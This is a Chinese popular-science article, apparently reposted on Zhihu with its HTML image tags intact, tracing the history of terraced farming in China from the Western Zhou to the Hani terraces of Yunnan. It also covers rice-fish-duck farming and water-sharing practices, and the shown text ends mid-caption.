src=\"https://pic2.zhimg.com/v2-3cc15c59eee2de55f3b436c642934052_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1693\" data-watermark=\"original\" data-original-src=\"v2-3cc15c59eee2de55f3b436c642934052\" data-watermark-src=\"v2-49cf63ffa510b0b373abe4cff89323a2\" data-private-watermark-src=\"v2-ea2f3754813e2a87e8177a38194bc662\"></p>\n<p>你也许无法想象，在中国约20亿亩的总耕地面积中，居然超过1/4都是<b>梯田。</b></p>\n<p>中国不仅是全球梯田面积最大的国家，还是全球梯田类型最多、分布区域最广的国家。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-edad9ae53ae414f57ec068ba1273c3e7_720w.webp?rss\" data-caption=\"不同口径下统计我国梯田面积数据存在差异，本文依据清华大学地球系统科学系俞乐课题组遥感测量数据，即8亿亩左右，图为中国梯田分布示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1890\" data-watermark=\"original\" data-original-src=\"v2-edad9ae53ae414f57ec068ba1273c3e7\" data-watermark-src=\"v2-3cab234e2fcf3d582855ee5ac6b394d4\" data-private-watermark-src=\"v2-7b4a1078ac3c1900316de44cc6f4e52e\"></p>\n<p>尽管梯田的踪影遍布全球，但中国千百年来的农耕智慧，把梯田发挥到了极致。</p>\n<p>著名的广西<b>龙脊梯田，</b>层级最多达1100余级，最大垂直落差860余米。从远处眺望，密密麻麻的曲线令人震撼。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic3.zhimg.com/v2-61a2e4fd8cb50b6a728f453d996a86a2_720w.jpg?rss\" data-caption=\"广西龙胜龙脊梯田，摄影师@何旭龙\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"3881\" data-watermark=\"original\" data-original-src=\"v2-61a2e4fd8cb50b6a728f453d996a86a2\" data-watermark-src=\"v2-d374838ef5c40a69aedaff0bb1e5b05d\" data-private-watermark-src=\"v2-fc7bc6e1f5062c22e10cf77b1e7bf040\"></p>\n<p>但这还不是最震撼的。</p>\n<p>位于云南的<b>哈尼梯田，</b>总面积更是夸张到超过100万亩，层级从上到下多达3000余级，最大垂直落差2000余米。</p>\n<p>如果游客想从山脚的梯田走到最高处的梯田，几乎相当于攀爬一次华山。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-56df6b6831a35ec1465aa2bea6066c08_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@嘉楠\" data-size=\"normal\" data-rawwidth=\"998\" data-rawheight=\"2000\" data-watermark=\"original\" data-original-src=\"v2-56df6b6831a35ec1465aa2bea6066c08\" data-watermark-src=\"v2-6752ee8b529cc7debcea93db5287d7d8\" data-private-watermark-src=\"v2-6387c9d3f0501bf69e47bf613a6eab60\"></p>\n<p>我们的祖先为什么要建设如此壮观的梯田？其中隐藏着怎样的生存智慧？</p>\n<p>在星球研究所看来，这些梯田既是绵延起伏的风景，是重塑山地的艺术，更是山地之中无数族群奋斗上千年的史册，是改变族群命运的层层阶梯。</p>\n<hr>\n<h2><b>01 诞生</b></h2>\n<p>早在西周时期，随着平原上人口增加，一部分人便开始开垦丘陵坡地。</p>\n<p>在都城镐（hào）京（今西安）周边，人们清除坡地上原有的植被，种植果树和作物。《诗经·正月》唱道：<b>「瞻彼阪</b>（bǎn）<b>田，有菀</b>（wǎn）<b>其特」，</b>即「看山坡的田地里，禾苗长得多茂盛」。</p>\n<p>不过，这时的坡地种植更多的是顺坡就势，并没有形成一层层上下分割明显的台阶。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-00f535898d7db89f45416643bfd6d897_720w.webp?rss\" data-caption=\"新疆江布拉克山坡上的麦田，仅作示意，摄影师@飞翔\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-00f535898d7db89f45416643bfd6d897\" data-watermark-src=\"v2-45c893665a395185d4932822cb6e211b\" data-private-watermark-src=\"v2-dedf848b4707af9cde2af4973ad823eb\"></p>\n<p>到了汉代，随着牛耕和铁器的普及，人们拥有了可以改造山地丘陵的更大力量。</p>\n<p>在黄土高原的南部山区以及四川盆地的坡地上，人们用农具修建出田埂沟渠，逐渐形成了台阶状的田地。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-cfc84b35d6cc8fe26348259d6d1d2039_720w.webp?rss\" data-caption=\"东汉陶水田，出土于四川东汉墓，是我国最早与梯田相关的文物证据之一，现存于南京博物院，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1331\" data-watermark=\"original\" data-original-src=\"v2-cfc84b35d6cc8fe26348259d6d1d2039\" data-watermark-src=\"v2-de591523800c2e221c00a1b37f286819\" data-private-watermark-src=\"v2-738c305f7bc8ac662ff1599fbb5e9407\"></p>\n<p>在不断地改造山地的过程中，<b>原始的梯田</b>便诞生了。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-426d9ae64951e5126001246904d326ca_720w.gif?rss\" data-caption=\"梯田的演变过程示意，制图@王申雯/星球研究所\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1482\" data-watermark=\"original\" data-original-src=\"v2-426d9ae64951e5126001246904d326ca\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不过，北方及四川盆地平地相对较多，此时梯田的开发并不突出。但随着此后中原地区不断的王朝更迭、战乱频仍，北方汉族被迫大量向南方迁徙，梯田逐渐开始在山地众多的<b>南方</b>大展身手。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0b4767c4a9b3d5d69b504f662e9b3dcf_720w.webp?rss\" data-caption=\"湖南新化紫鹊界梯田，摄影师@柳勇\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"607\" data-watermark=\"original\" data-original-src=\"v2-0b4767c4a9b3d5d69b504f662e9b3dcf\" data-watermark-src=\"v2-15c494283ec64d301130a07fea1488de\" data-private-watermark-src=\"v2-0f1dcfe4393ccc35f4914d2d0e6653ba\"></p>\n<p>由于南方降水更多，梯田的建设反而比北方拥有更大的优势，山地间丰沛的地下水、随处流淌的山溪为梯田提供了充足的水源，而当水源灌满梯田，又与需水量极大的<b>水稻</b>相遇，形成<b>「梯田-水稻」</b>的绝佳搭档，并逐渐成为南方最主要的农业模式之一。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d29cc89dce652628f03978bb234c6e97_720w.gif?rss\" data-caption=\"梯田引水灌溉过程示意，制图@王申雯&amp;amp;陈随/星球研究所\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"961\" data-watermark=\"original\" data-original-src=\"v2-d29cc89dce652628f03978bb234c6e97\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在黄山山脉、天目山等山地纵横的<b>古徽州</b>地区，移民们开垦出<b>婺源江岭梯田、篁岭梯田</b>等。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1f4333627f50bcff191997f41d0154b7_720w.webp?rss\" data-caption=\"江西婺源江岭梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"988\" data-rawheight=\"1481\" data-watermark=\"original\" data-original-src=\"v2-1f4333627f50bcff191997f41d0154b7\" data-watermark-src=\"v2-48556bbe3a2c7d1c360cf07847433ef5\" data-private-watermark-src=\"v2-13bfb656f2518a03d5ca4b5320e26451\"></p>\n<p>他们还在这里实施<b>水稻-油菜轮作</b>以提升土地利用率，获取油料资源。</p>\n<p>每年秋季水稻收获后便开始种植油菜，到了次年三四月份，油菜花开，大地金黄，再加上粉墙黛瓦，峰峦峻峭之间薄雾绵绵，如同世外桃源。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic3.zhimg.com/v2-089941cc1f8f0ad0b91c72feab0a67c0_720w.webp?rss\" data-caption=\"村寨与油菜梯田在婺源土地上错落相间，摄影师@李程光\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2118\" data-watermark=\"original\" data-original-src=\"v2-089941cc1f8f0ad0b91c72feab0a67c0\" data-watermark-src=\"v2-8adb096ab2338a602fca5ceb6f2cdd8c\" data-private-watermark-src=\"v2-66257af9fea171a5619a304c7ddcf4df\"></p>\n<p>而在以山多著称的<b>福建，</b>自古就有「八山一水一分田」的说法。</p>\n<p>自唐朝中期起，大量北方移民在福建尤溪县境内开荒筑田，逐渐在重峦叠嶂之中开垦出气势磅礴的登天之梯，<b>尤溪联合梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d8237c45288a98595825bfbbb1006f09_720w.webp?rss\" data-caption=\"福建尤溪联合梯田，摄影师@赵必然\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-d8237c45288a98595825bfbbb1006f09\" data-watermark-src=\"v2-2e9beb89d01a028fc825bbd6376c9598\" data-private-watermark-src=\"v2-3584b9dccbcc3933bb0ddc21550d5776\"></p>\n<p>在<b>江西南部，</b>由于易于耕作的平原地区已经被更早到达的移民所占据，晚到的<b>客家人</b>只能在山地之上开垦梯田。</p>\n<p>其中位于赣州市崇义县的<b>上堡梯田，</b>面积超过2万亩，最高海拔可达1200米，为面积最大的客家梯田。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-38c38e050a5fe0b8992eccfe9de458f7_720w.webp?rss\" data-caption=\"江西崇义上堡梯田，摄影师@陈彦\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-38c38e050a5fe0b8992eccfe9de458f7\" data-watermark-src=\"v2-ca8ce1fe6a4b67d2293ccbcfd0b260e6\" data-private-watermark-src=\"v2-10bcf502fe334a84c01ecb5128af2a8f\"></p>\n<p>从空中俯瞰，或顺山势逐级下降，</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4d6f230c5b43f5dc2c4f96ef16e251a8_720w.webp?rss\" data-caption=\"初春之时，尚未进行插秧的上堡梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2044\" data-watermark=\"original\" data-original-src=\"v2-4d6f230c5b43f5dc2c4f96ef16e251a8\" data-watermark-src=\"v2-da2dc81d213b35473d7e11a24597bc21\" data-private-watermark-src=\"v2-acd5a14379146d22d4464a1aab6e54b5\"></p>\n<p>或蜿蜒盘旋，如同一个巨大的漩涡。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-631b672682fa2dcad666cf3e7b1803f4_720w.webp?rss\" data-caption=\"江西崇义上堡梯田，摄影师@陈彦\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-631b672682fa2dcad666cf3e7b1803f4\" data-watermark-src=\"v2-4d55f30758a17555534dfb28161446fa\" data-private-watermark-src=\"v2-1d5736408b508034ba6f472af056abc5\"></p>\n<p>而在江西的其他地方，以及福建、广东等地，客家人的梯田同样遍布。例如福建<b>永定梯田</b>、江西<b>西向梯田、</b>江西<b>遂川梯田、</b>广东<b>坪山梯田、</b>广东<b>五山梯田</b>、广东<b>清溪梯田</b>等等。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ce42f3f7eb8f9caca6408f08458731cb_720w.webp?rss\" data-caption=\"福建永定初溪土楼附近的梯田，摄影师@李艺爽\" data-size=\"normal\" data-rawwidth=\"1065\" data-rawheight=\"1786\" data-watermark=\"original\" data-original-src=\"v2-ce42f3f7eb8f9caca6408f08458731cb\" data-watermark-src=\"v2-d9e5a1092318db210d299a92e67d14d3\" data-private-watermark-src=\"v2-981e28df6a3d0f992ea9b3413e995d27\"></p>\n<p>这些地方经济相对富庶，除种植传统的粮食作物外，茶树、桑树、桃树等经济作物同样成为梯田的主角，形成茶园梯田、桑园梯田、果树梯田等。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b1829d90b1f3435a5e7afaae49ca3b33_720w.jpg?rss\" data-caption=\"雪后的浙江武义高山茶园梯田，摄影师@项新平\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-b1829d90b1f3435a5e7afaae49ca3b33\" data-watermark-src=\"v2-4757de8e3796587b3a43da7cf7555acd\" data-private-watermark-src=\"v2-78722d7a60afcc0b7e5501629132f65d\"></p>\n<p>到了明清时期，中国古代人口达到顶峰，苛捐杂税、土地兼并，大量农民被逼上了更加人迹罕至的山区并因居住在简陋的茅棚之中，而被称为<b>棚民。</b></p>\n<p>在位于秦巴山区的陕西汉阴县，棚民及其后代开垦出了<b>凤堰古梯田。</b></p>\n<p>（陕西汉阴凤堰古梯田，图片来源@视觉中国）</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4e2153556af09252c56aa1030685e21f_720w.webp?rss\" data-caption=\"陕西汉阴凤堰古梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2212\" data-watermark=\"original\" data-original-src=\"v2-4e2153556af09252c56aa1030685e21f\" data-watermark-src=\"v2-c01d7f3676d13a4814329081c1cee17b\" data-private-watermark-src=\"v2-929e3fc4984f7a5daae7217507915c12\"></p>\n<p>这里地处中国自然地理的南北分界线，除了水田，还大量种植小麦、玉米、番薯等旱地作物，形成水旱间作、南北兼顾的特色。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6d624cca9f595adbcbea6a249c02534c_720w.jpg?rss\" data-caption=\"凤堰古梯田，可以看到水田、旱田同时存在，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-6d624cca9f595adbcbea6a249c02534c\" data-watermark-src=\"v2-206927df7df3b926fa5821e4d1ad9e61\" data-private-watermark-src=\"v2-d5094ff8082dea485903d9743ef47661\"></p>\n<p>众多梯田的开发也对山地中的土著部落产生了影响。</p>\n<p><b>畲（</b>shē）<b>族</b>的先祖居住在浙闽山区，本意即为通过放火烧荒获得耕地，而随着梯田技术的传播，畲田逐渐被梯田替代。</p>\n<p>在浙江南部的云和县，由畲族与汉族共同开垦的<b>云和梯田，</b>在山谷中蜿蜒迂回、连绵不断，多达700多级。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e19444fea874155bfeb8273bb7c76369_720w.webp?rss\" data-caption=\"浙江丽水云和梯田，摄影师@张进\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e19444fea874155bfeb8273bb7c76369\" data-watermark-src=\"v2-2ef2c7e1786e7d44aa71332853d0d062\" data-private-watermark-src=\"v2-ebb2d9f65d676e380b901eb03f671aa3\"></p>\n<p>即使历经1200多年的时光，也依旧是盛产稻谷的良田，是云雾之上壮丽的人类风景。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b88424a815e8f9bd24b8dbafaf49ae4_720w.jpg?rss\" data-caption=\"浙江丽水云和梯田，摄影师@段黄德\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2421\" data-watermark=\"original\" data-original-src=\"v2-2b88424a815e8f9bd24b8dbafaf49ae4\" data-watermark-src=\"v2-177d49130a69206958b8fff9693c3ac2\" data-private-watermark-src=\"v2-70130d755bda10af0342e7e3817bc2a0\"></p>\n<p>至此，梯田从北方起源并扩散至南方山地，而随着大量人口向西南地区拓展，古代梯田开发的巅峰</p>\n<p>才真正到来。</p>\n<p>它将在面积、层级、坡度等诸多方面全面胜出，形成无人能及的梯田王国。</p>\n<hr>\n<h2><b>02 壮大</b></h2>\n<p>在广义的<b>西南地区，</b>山地更多，且更加高大，生活在此的民族也更加多样。面对人多地少的生存压力，梯田被发挥到极致。</p>\n<p>作为中国第二、三级阶梯分界线的<b>雪峰山脉，</b>在湖南新化县绵延。这里山势陡峭，苗、瑶、侗、汉等族居民在此修筑<b>紫鹊界梯田，</b>其坡度高达25°-40°，最大则超过50°。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b54a7316b4df03f5fa8f79e0e0b50251_720w.jpg?rss\" data-caption=\"湖南新化紫鹊界梯田，摄影师@俞琳\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1619\" data-watermark=\"original\" data-original-src=\"v2-b54a7316b4df03f5fa8f79e0e0b50251\" data-watermark-src=\"v2-c952a0c6aa743c7f031a78c4ed78ca48\" data-private-watermark-src=\"v2-1a28a3d025c89c77b62bd4a598d4eee4\"></p>\n<p>历经千年之后，梯田总面积多达8万亩，相当于7千多个标准足球场，山地间梯田遍布、云海蒸腾。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2f3424cc2b6ec9f4c9f96bf1cec6a166_720w.webp?rss\" data-caption=\"浸浴在云雾之中的紫鹊界梯田，图片来源@视觉中国\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1616\" data-watermark=\"original\" data-original-src=\"v2-2f3424cc2b6ec9f4c9f96bf1cec6a166\" data-watermark-src=\"v2-b020c4893c10365a4532e8f369cb2aae\" data-private-watermark-src=\"v2-3c05e97ac8cabe22074e30fb37f9d0a3\"></p>\n<p>此外，在贵州从江县月亮山腹地，侗族、苗族和壮族聚居于此，共同修筑了壮观的<b>加榜梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-142a4c6feb3f7702b2c3da5749573d3a_720w.webp?rss\" data-caption=\"放学的孩子，沿着加榜梯田的田埂归家，摄影师@老西关\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1605\" data-watermark=\"original\" data-original-src=\"v2-142a4c6feb3f7702b2c3da5749573d3a\" data-watermark-src=\"v2-6da0da38b4e84b126eebc8c883216e62\" data-private-watermark-src=\"v2-558c3fdc4cfda8ea346c31fc82c9ad77\"></p>\n<p>梯田中，农民们放养鱼、鸭，稻田为鱼、鸭供觅食场所，鱼、鸭捕食昆虫减少水稻病虫害，鱼粪鸭粪又促进水稻生长，从而构成了一个高效的<b>「稻鱼鸭共生系统」。</b></p>\n<p>为此，当地人有意加高田埂，从而提高稻田蓄水量、载鱼量。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e75ea37665748a8fd25423831e81cfdd_720w.webp?rss\" data-caption=\"梯田之中饲养的鸭子与较高的田埂，摄影师@崔永江\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1585\" data-watermark=\"original\" data-original-src=\"v2-e75ea37665748a8fd25423831e81cfdd\" data-watermark-src=\"v2-04b547731c8981d586c3a1ffe5eb9371\" data-private-watermark-src=\"v2-6d2a44eb37dd49a3e6ae598326a1264f\"></p>\n<p>在广西桂林龙胜县，壮族、瑶族共同开拓出最多层级达1100多级的<b>龙脊梯田，</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-827b7bf5239dabd353ad5852d2744fae_720w.webp?rss\" data-caption=\"广西龙胜龙脊梯田，摄影师@吕凤霄\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1923\" data-watermark=\"original\" data-original-src=\"v2-827b7bf5239dabd353ad5852d2744fae\" data-watermark-src=\"v2-cece1ae01f4585b305a00837f84be245\" data-private-watermark-src=\"v2-11c12d937f3314434bbec2c66b4402e8\"></p>\n<p>他们在崇山峻岭之中依靠血肉之躯，养育了一代代的子孙。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c07ac10f597792ae88ce7dd4b4a9fd6f_720w.webp?rss\" data-caption=\"红瑶居民正在龙脊梯田之中耕作，当地红瑶因穿红色服装而得名，也被誉为「桃花林中的民族」，摄影师@Jan\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-c07ac10f597792ae88ce7dd4b4a9fd6f\" data-watermark-src=\"v2-5eeb8e398b01cf2b6c1cd62f0c64e782\" data-private-watermark-src=\"v2-05c32ab6ec813e412107cb12591431c9\"></p>\n<p>层层叠叠的梯田，如潮水般在群山间涌动。</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d719aa07325607ef8804157ff28202e5_720w.webp?rss\" data-caption=\"群山环绕下的龙脊梯田与少数民族民居，摄影师@林昉\" data-size=\"normal\" data-rawwidth=\"941\" data-rawheight=\"3000\" data-watermark=\"original\" data-original-src=\"v2-d719aa07325607ef8804157ff28202e5\" data-watermark-src=\"v2-560b10931873c58d68aede4e51aaa645\" data-private-watermark-src=\"v2-2430c6fc570e513aeeda0f3212107195\"></p>\n<p>而最壮观的则莫过于位于云南元阳、绿春、红河、金平等县的——<b>哈尼梯田。</b></p>\n<p>两千多年前，西北氐羌族群的一部分开始了漫长地向南迁徙。他们最终到达云南哀牢山南段，形成了如今的<b>哈尼族。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-67542440b301e1d4358f8a6bc886b0d3_720w.gif?rss\" data-caption=\"哈尼族迁徙路线示意，制图@郑艺/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-67542440b301e1d4358f8a6bc886b0d3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在这里，虽然终结了千年的漂泊，但在与其他的民族竞争中，哈尼族不得不离开平地，走向了大山深处。</p>\n<p>正如他们的吟唱：<i><b>我们哈尼人，经历了数不尽的灾难，平平的坝子虽然好，天灾人祸太多我们不能在。</b></i>（哈尼族歌谣，转引自《红河哈尼梯田形成史调查和推测》）</p>\n<p>于是在神灵的指引下：<b><i>从老鼠那里学会了种植，从...大猪那里学会了翻地，从...水牛那里学会了开田，从此哈尼人再也离不开梯田和水。</i></b>（哈尼族歌谣，转引自《云南红河哈尼稻作梯田系统》）</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic4.zhimg.com/v2-374e8e3a8a18e35b17005d9b6561dd38_720w.jpg?rss\" data-caption=\"云南将平坦的山间盆地称为坝子；图为元阳哈尼族「四季梯田」实景演出，表现其民族迁徙及山地生存方式，摄影师@戴云良\" data-size=\"normal\" data-rawwidth=\"666\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-374e8e3a8a18e35b17005d9b6561dd38\" data-watermark-src=\"v2-79b15cf4b124f4aa85555c63f40cffcd\" data-private-watermark-src=\"v2-5c7116dbd1a2de8f9b8210c888ee5099\"></p>\n<p>哈尼梯田系统一般由四个部分组成，即<b>「森林-村寨-梯田-水系」</b>四素同构。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ed79ed5dae4cbfeffd352626885d993c_720w.webp?rss\" data-caption=\"哈尼梯田四素同构景观示意，我国南方大部分水作梯田也有类似的景观分布，制图@王申雯&amp;amp;陈随/星球研究所\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1546\" data-watermark=\"original\" data-original-src=\"v2-ed79ed5dae4cbfeffd352626885d993c\" data-watermark-src=\"v2-71aca61af07f043f44530358080b21f4\" data-private-watermark-src=\"v2-c82733523b15238f3fc76bc12ba4246d\"></p>\n<p>在这个系统的最高处是哀牢山茂密的<b>森林。</b></p>\n<p>森林吸纳降水，形成溪泉，并向下流淌。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-93939725762af9f865590820834c1ec3_720w.webp?rss\" data-caption=\"哀牢山上的高山森林，摄影师@柴峻峰\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-93939725762af9f865590820834c1ec3\" data-watermark-src=\"v2-4a0556833f0d4f80e9be5709463aabb2\" data-private-watermark-src=\"v2-10fdb9aa266656ec9c2d74f3c92d2169\"></p>\n<p>森林之下，海拔800-1500米之间，哈尼族在此建立<b>村寨，</b>并通过挖沟修渠引水入村以满足人畜所需。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-04a71a45254fd128113eb9844cb864da_720w.webp?rss\" data-caption=\"森林之下的哈尼族村寨，摄影师@崔永江\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1693\" data-watermark=\"original\" data-original-src=\"v2-04a71a45254fd128113eb9844cb864da\" data-watermark-src=\"v2-5a64234723d3a210c94dd79bba6b0210\" data-private-watermark-src=\"v2-35bfd2ec3fc52340e49bdfc5989ccd00\"></p>\n<p>再往下，溪水裹挟着森林与村寨中的营养物质，进入村寨下方的<b>梯田。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-14ce8c74dc8afad2a6590761068eefc8_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@刘珠明\" data-size=\"normal\" data-rawwidth=\"888\" data-rawheight=\"1332\" data-watermark=\"original\" data-original-src=\"v2-14ce8c74dc8afad2a6590761068eefc8\" data-watermark-src=\"v2-a28166ee286efa39f3e062fc9eff66d8\" data-private-watermark-src=\"v2-49c5d8b87402ce42cc2730abef72f2cd\"></p>\n<p>为保证大小不一的梯田得到相对均衡的供水，当地人还在水沟中设置木桩，木桩上刻出大小不同的槽口，从而实现水量合理分配，是为<b>木刻分水。</b></p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-1b961f01221a1ef2e2ed157e1a86e411_720w.jpg?rss\" data-caption=\"木刻分水是哈尼族在梯田用水方面的一大智慧创造，下图为八口分水器，会将一条溪水分散到八块不同的梯田，摄影师@张洪科\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1411\" data-watermark=\"original\" data-original-src=\"v2-1b961f01221a1ef2e2ed157e1a86e411\" data-watermark-src=\"v2-faa8fa7a76426f28084055f9874f2109\" data-private-watermark-src=\"v2-122608515aeb95275fd454918af40681\"></p>\n<p>再往下，溪水经过层层梯田，最终在山谷底部汇入<b>江河</b>之中，炎热的河谷又将河水蒸发到空中，再次汇集到高山森林，重新形成雾水，终而复始地进行循环。</p>\n<p>在容易出现<b>干旱</b>的云南，「森林-村寨-梯田-水系」四素同构的体系，却可以让哈尼梯田保持持续不断的水源供给。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-fac1f2f98c89f18fa6bc58dfc0f88080_720w.webp?rss\" data-caption=\"云南红河哈尼梯田，摄影师@潘泉\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1512\" data-watermark=\"original\" data-original-src=\"v2-fac1f2f98c89f18fa6bc58dfc0f88080\" data-watermark-src=\"v2-f9c5123154ee356c7a1e1bba809a375a\" data-private-watermark-src=\"v2-6b7e9f16968bb3ffb9dd4f2efebd8298\"></p>\n<p>凭借这样的智慧，哈尼族建造出了总面积高达100万亩的梯田。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-907960b4935fac0ebcab19666ab83068_720w.webp?rss\" data-caption=\"云南红河哈尼梯田鳞次栉比排布于高山之中，摄影师@林宇先\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-907960b4935fac0ebcab19666ab83068\" data-watermark-src=\"v2-1612ba638b1a7de28e775ee55dabb53b\" data-private-watermark-src=\"v2-a8fdc1df479a4491b099a98335af37bf\"></p>\n<p>梯田层级可以达3000多级，垂直落差2000多米，</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4fd4676dfe16701986741a29fd1d0c25_720w.webp?rss\" data-caption=\"空中俯瞰云南红河哈尼梯田，摄影师@胡艳辉\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-4fd4676dfe16701986741a29fd1d0c25\" data-watermark-src=\"v2-6cb823d3bbf14ea96601268ccafcb3a7\" data-private-watermark-src=\"v2-5104262431b5b8c75b40dc2e54d8c20b\"></p>\n<p>平均坡度约20°，最大可达约60°。</p>\n<p><b>▼</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-33e9418e14ac59c50cf0f48d7ab5bca4_720w.webp?rss\" data-caption=\"修建在山脊间的云南红河哈尼梯田，摄影师@邱会宁\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1844\" data-watermark=\"original\" data-original-src=\"v2-33e9418e14ac59c50cf0f48d7ab5bca4\" data-watermark-src=\"v2-c31d49a316593c92076161719841a3c1\" data-private-watermark-src=\"v2-12982f8ec8109befd5a5cd4422565266\"></p>\n<p>当你从高处俯瞰，一望无际、层层叠叠的梯田如同排山倒海地袭来，几乎撑满你的眼眶。</p>\n<p>如流动的乐谱，</p>\n<p><b>▼</b>请横屏观看</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bdf9f621ce6ec3ca9de0c50fff2462ba_720w.jpg?rss\" data-caption=\"云南红河哈尼梯田，摄影师@王超\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1947\" data-watermark=\"original\" data-original-src=\"v2-bdf9f621ce6ec3ca9de0c50fff2462ba\" data-watermark-src=\"v2-d1ee31880f39ac7e69215b8ce94a7fa0\" 